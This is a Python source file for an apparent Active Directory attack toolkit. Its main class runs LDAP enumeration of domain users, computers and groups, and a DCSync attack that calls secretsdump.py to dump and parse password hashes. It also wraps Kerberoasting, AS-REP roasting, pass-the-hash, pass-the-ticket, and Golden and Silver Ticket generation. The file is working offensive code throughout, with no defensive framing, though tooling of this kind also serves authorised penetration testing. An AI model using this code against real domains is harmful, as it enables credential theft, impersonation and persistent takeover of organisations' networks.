"""Active Directory attacker - main orchestration class."""

import re
import subprocess
import importlib.util
from typing import List, Dict, Optional, Any
from pathlib import Path

# Import sub-modules
from .kerberos import KerberosAttacker
from .ntlm import NTLMAttacker
from .tickets import TicketGenerator
from .bloodhound_helper import BloodHoundHelper


class ADAttacker:
    """Main Active Directory attack orchestration class."""

    def __init__(self):
        """Initialize AD attacker with all sub-modules."""
        self.kerberos = KerberosAttacker()
        self.ntlm = NTLMAttacker()
        self.tickets = TicketGenerator()
        self.bloodhound = BloodHoundHelper()

    def check_available(self) -> bool:
        """Check if required dependencies are available.

        Returns:
            True if impacket or ldap3 is available
        """
        # Check for impacket
        impacket_spec = importlib.util.find_spec("impacket")
        if impacket_spec is not None:
            return True

        # Check for ldap3 as fallback
        ldap3_spec = importlib.util.find_spec("ldap3")
        return ldap3_spec is not None

    def enumerate_domain(
        self,
        domain: str,
        username: Optional[str] = None,
        password: Optional[str] = None
    ) -> Optional[Dict[str, Any]]:
        """Enumerate domain users, groups, and computers.

        Args:
            domain: Target domain (e.g., corp.local)
            username: Optional username for authentication
            password: Optional password for authentication

        Returns:
            Dictionary with users, groups, and computers lists
        """
        try:
            import ldap3

            # Build LDAP server URL
            server = ldap3.Server(domain, get_info=ldap3.ALL)

            # Determine authentication mode
            if username and password:
                conn = ldap3.Connection(
                    server,
                    user=f"{username}@{domain}",
                    password=password,
                    auto_bind=True
                )
            else:
                # Anonymous bind
                conn = ldap3.Connection(server, auto_bind=True)

            # Get domain DN
            domain_dn = ','.join([f"DC={dc}" for dc in domain.split('.')])

            # Enumerate users
            users = []
            conn.search(
                search_base=domain_dn,
                search_filter='(objectClass=user)',
                attributes=['sAMAccountName', 'cn', 'memberOf']
            )
            for entry in conn.entries:
                if hasattr(entry, 'sAMAccountName'):
                    users.append({
                        'username': entry.sAMAccountName.value,
                        'dn': entry.entry_dn
                    })

            # Enumerate computers
            computers = []
            conn.search(
                search_base=domain_dn,
                search_filter='(objectClass=computer)',
                attributes=['sAMAccountName', 'cn', 'operatingSystem']
            )
            for entry in conn.entries:
                if hasattr(entry, 'sAMAccountName'):
                    computers.append({
                        'name': entry.sAMAccountName.value,
                        'dn': entry.entry_dn
                    })

            # Enumerate groups
            groups = []
            conn.search(
                search_base=domain_dn,
                search_filter='(objectClass=group)',
                attributes=['sAMAccountName', 'cn', 'member']
            )
            for entry in conn.entries:
                if hasattr(entry, 'sAMAccountName'):
                    groups.append({
                        'name': entry.sAMAccountName.value,
                        'dn': entry.entry_dn
                    })

            conn.unbind()

            return {
                'domain': domain,
                'users': users,
                'computers': computers,
                'groups': groups
            }

        except Exception as e:
            print(f"❌ Domain enumeration failed: {e}")
            return {"error": str(e)}

    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str
    ) -> List[Dict[str, str]]:
        """Execute Kerberoasting attack to extract service account hashes.

        Args:
            domain: Target domain
            username: Domain username
            password: User password

        Returns:
            List of dictionaries with username, SPN, and hash
        """
        return self.kerberos.kerberoast(domain, username, password)

    def asreproast(
        self,
        domain: str,
        user_list: Optional[str] = None
    ) -> List[Dict[str, str]]:
        """Execute AS-REP roasting to find accounts without Kerberos pre-auth.

        Args:
            domain: Target domain
            user_list: Optional path to file with usernames to test

        Returns:
            List of dictionaries with username and hash
        """
        return self.kerberos.asreproast(domain, user_list)

    def pass_the_hash(
        self,
        username: str,
        ntlm_hash: str,
        target: str,
        command: Optional[str] = None,
        domain: Optional[str] = None
    ) -> Optional[Dict[str, Any]]:
        """Execute Pass-the-Hash attack.

        Args:
            username: Username to authenticate as
            ntlm_hash: NTLM hash (LM:NTLM or just NTLM)
            target: Target IP or hostname
            command: Optional command to execute
            domain: Optional domain name

        Returns:
            Dictionary with success status and output
        """
        # Validate hash format
        if not self.ntlm._validate_ntlm_hash(ntlm_hash):
            print("❌ Invalid NTLM hash format")
            return {"error": "Invalid NTLM hash format"}

        return self.ntlm.pass_the_hash(
            username=username,
            ntlm_hash=ntlm_hash,
            target=target,
            command=command,
            domain=domain
        )

    def pass_the_ticket(
        self,
        ticket_path: str,
        target: str
    ) -> Dict[str, Any]:
        """Execute Pass-the-Ticket attack.

        Args:
            ticket_path: Path to Kerberos ticket (.ccache or .kirbi)
            target: Target IP or hostname

        Returns:
            Dictionary with success status
        """
        return self.ntlm.pass_the_ticket(ticket_path, target)

    def golden_ticket(
        self,
        domain: str,
        sid: str,
        krbtgt_hash: str,
        username: str = "Administrator"
    ) -> Optional[str]:
        """Generate Golden Ticket for domain persistence.

        Args:
            domain: Target domain
            sid: Domain SID (S-1-5-21-...)
            krbtgt_hash: KRBTGT account NTLM hash
            username: Username to impersonate (default: Administrator)

        Returns:
            Path to generated ticket file or None on error
        """
        # Validate SID format
        if not self.tickets._validate_sid(sid):
            print("❌ Invalid SID format")
            return None

        return self.tickets.generate_golden_ticket(
            domain=domain,
            sid=sid,
            krbtgt_hash=krbtgt_hash,
            username=username
        )

    def silver_ticket(
        self,
        domain: str,
        sid: str,
        service_hash: str,
        service: str,
        username: str
    ) -> Optional[str]:
        """Generate Silver Ticket for service access.

        Args:
            domain: Target domain
            sid: Domain SID
            service_hash: Service account NTLM hash
            service: Service SPN (e.g., CIFS/dc01.corp.local)
            username: Username to impersonate

        Returns:
            Path to generated ticket file or None on error
        """
        # Validate SID format
        if not self.tickets._validate_sid(sid):
            print("❌ Invalid SID format")
            return None

        return self.tickets.generate_silver_ticket(
            domain=domain,
            sid=sid,
            service_hash=service_hash,
            service=service,
            username=username
        )

    def dcsync(
        self,
        domain: str,
        username: str,
        password: str,
        target_user: Optional[str] = None
    ) -> Optional[Dict[str, Any]]:
        """Execute DCSync attack to dump password hashes.

        Args:
            domain: Target domain
            username: Domain admin username
            password: User password
            target_user: Specific user to dump (or None for all)

        Returns:
            Dictionary with hashes or error info
        """
        try:
            # Build secretsdump command
            cmd = [
                "secretsdump.py",
                f"{domain}/{username}:{password}@{domain}",
                "-just-dc"
            ]

            if target_user:
                cmd.extend(["-just-dc-user", target_user])

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            if result.returncode != 0:
                print(f"❌ DCSync failed: {result.stderr}")
                return {"error": result.stderr}

            # Parse output
            hashes = []
            for line in result.stdout.split('\n'):
                if ':::' in line and not line.startswith('['):
                    parts = line.split(':')
                    if len(parts) >= 4:
                        hashes.append({
                            'username': parts[0],
                            'rid': parts[1],
                            'lm': parts[2],
                            'ntlm': parts[3]
                        })

            return {
                'success': True,
                'hashes': hashes,
                'raw_output': result.stdout
            }

        except FileNotFoundError:
            print("❌ secretsdump.py not found (install impacket)")
            return {"error": "secretsdump.py not found"}
        except subprocess.TimeoutExpired:
            print("❌ DCSync timed out")
            return {"error": "Timeout"}
        except Exception as e:
            print(f"❌ DCSync error: {e}")
            return {"error": str(e)}
